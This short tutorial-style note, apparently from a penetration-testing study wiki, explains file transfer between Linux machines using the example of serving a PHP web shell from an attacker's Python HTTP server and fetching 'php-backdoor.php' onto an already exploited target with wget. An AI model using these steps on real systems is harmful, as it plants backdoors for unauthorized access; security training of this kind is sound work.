### How to transfer files between two Linux OS ?

1. We need multiple terminals to share files. If we are provided with a single terminal and no GUI, we can use the `tmux` utility to open multiple terminals within one terminal. Refer to [[Command line]] to learn how to use `tmux`. 

2. In our case, we'll be transferring a `PHP` web shell to the target machine which we've already exploited and have command shell access to.  

3. We'll navigate to the `/usr/share/webshells/php` directory and start our Python web server there. 
```
python3 -m http.server 80
```

4. We can download the file in our target system using the `wget` utility. 
```
wget http://<attacker-ip>/php-backdoor.php
```

5. We can confirm that the file has been downloaded successfully using the `ls` command.
